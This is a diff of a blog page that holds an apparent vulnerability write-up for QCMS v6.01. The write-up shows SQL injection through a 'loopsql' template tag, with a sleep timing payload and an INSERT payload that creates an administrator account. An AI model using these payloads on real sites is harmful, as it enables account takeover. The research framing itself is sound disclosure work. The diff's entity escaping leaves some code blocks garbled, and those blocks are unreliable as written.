@@ -85,7 +85,7 @@
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+       --><li><a href="/friends/">友链</a></li><!--
      -->
       </ul>
     </span>
@@ -179,18 +179,18 @@
 <p>Then follow the debugging process, and eventually find the SQL injection point in the ‘loop’:</p>
 <p><img src="/Blogimages/QCMS_v6.01/image-20230517190856-2j3xino.png" alt="image"></p>
 <p>There is a regular expression to pass:</p>
-<pre class=" language-xml"><code class="language-xml">/{{loop([\s\S.]*?)}}([\s\S.]*?){{\/loop}}/i
+<pre class=" language-xml"><code class="language-xml">/<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loop([\s\S.]*?)<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>([\s\S.]*?)<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>\/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>/i
 </code></pre>
 <p>Matching is straightforward:</p>
-<pre class=" language-xml"><code class="language-xml">{{loop}}a{{/loop}}
+<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
 </code></pre>
 <p>And what needs to be matched here is $Matches[1]</p>
 <p><img src="/Blogimages/QCMS_v6.01/image-20230517191025-pj8v8sn.png" alt="image"></p>
 <p>So you need to control</p>
-<pre class=" language-xml"><code class="language-xml">{{loop(controlled)}}a{{/loop}}
+<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loop(controlled)<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
 </code></pre>
 <p>And there’s another line $Para[‘sql’], so the controlled area is</p>
-<pre class=" language-xml"><code class="language-xml">{{loopsql}}a{{/loop}}
+<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loopsql<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
 </code></pre>
 <p>Enter <code>self::_getKv($v)</code></p>
 <p><img src="/Blogimages/QCMS_v6.01/image-20230517191503-o34dp04.png" alt="image"></p>
@@ -199,7 +199,7 @@
 </code></pre>
 <p>The format here is like sql&#x3D;’xxx’</p>
 <p>We pass parameters</p>
-<pre class=" language-xml"><code class="language-xml">{{loopsql=''xxx}}a{{/loop}}
+<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loopsql=''xxx<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
 </code></pre>
 <p>This way sql&#x3D;’xxx’ is returned</p>
 <p><img src="/Blogimages/QCMS_v6.01/image-20230517191653-e4onphr.png" alt="image"></p>
@@ -214,21 +214,21 @@ Router.php:97, Router->ViewController()
 Router.php:22, Router->__construct()
 Router.php:25, Router::get_instance()
 X.php:27, require()
-index.php:29, {main}()
+index.php:29, <span class="token entity" title="&#123;">&amp;#123;</span>main<span class="token entity" title="&#125;">&amp;#125;</span>()
 </code></pre>
 <p><img src="/Blogimages/QCMS_v6.01/image-20230517192004-ufhk7j5.png" alt="image"></p>
 <p>It directly executes what is passed in, leading to SQL injection</p>
-<pre class=" language-xml"><code class="language-xml">{{loopsql='select sleep(1)'}}{{/loop}}
+<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loopsql='select sleep(1)'<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
 </code></pre>
 <p>Proof of harm:</p>
 <p><img src="/Blogimages/QCMS_v6.01/image-20231003192019-t5dzdb0.png" alt="image"></p>
 <p>Enter a time-delayed query statement, and find a delay of 7s here because</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
     <span class="token variable">$Para</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">_getKv</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$Para</span><span class="token punctuation">[</span><span class="token string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span> 
     <span class="token variable">$Search</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token variable">$Replace</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">_replaceLoop</span><span class="token punctuation">(</span><span class="token variable">$Para</span><span class="token punctuation">[</span><span class="token string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'Loop_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
 </code></pre>
 <p>This line will cause sleep to execute multiple times, resulting in a seven-second delay</p>
 <p>If we change the sleep time to 2:</p>
@@ -236,7 +236,7 @@ index.php:29, {main}()
 <p>And we can also see sleep(2) executed 7 times in the SQL execution log</p>
 <p><img src="/Blogimages/QCMS_v6.01/image-20231003192326-zl735j8.png" alt="image"></p>
 <p>This way we can change the database password:</p>
-<pre class=" language-xml"><code class="language-xml">{{loopsql='INSERT INTO qc_user (UserId, Phone, NickName, Head, Password, Name, Address, Sex, Mail, MailCheck, Money, Coins, State, TsAdd, IpAdd, GroupUserId, GroupAdminId, IsAdmin, TsLast, IpLast) VALUES (999, "18898765432", "Administrator", "", "e10adc3949ba59abbe56e057f20f883e", "", "", 1, "", 2, 0.00, 0, 1, 1684310395, "127.0.0.1", 1, 1, 1, 1684310876, "127.0.0.1");'}}a{{/loop}}
+<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loopsql='INSERT INTO qc_user (UserId, Phone, NickName, Head, Password, Name, Address, Sex, Mail, MailCheck, Money, Coins, State, TsAdd, IpAdd, GroupUserId, GroupAdminId, IsAdmin, TsLast, IpLast) VALUES (999, "18898765432", "Administrator", "", "e10adc3949ba59abbe56e057f20f883e", "", "", 1, "", 2, 0.00, 0, 1, 1684310395, "127.0.0.1", 1, 1, 1, 1684310876, "127.0.0.1");'<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
 </code></pre>
 <!-- flag of hidden posts -->
   </div>
@@ -265,7 +265,7 @@ index.php:29, {main}()
         
           <li><a href="/categories/">分类</a></li>
         
-          <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+          <li><a href="/friends/">友链</a></li>
         
       </ul>
     </div>
@@ -327,7 +327,7 @@ index.php:29, {main}()
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
-      --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+      --><li><a href="/friends/">友链</a></li><!--
     -->
       </ul>
       <ul>
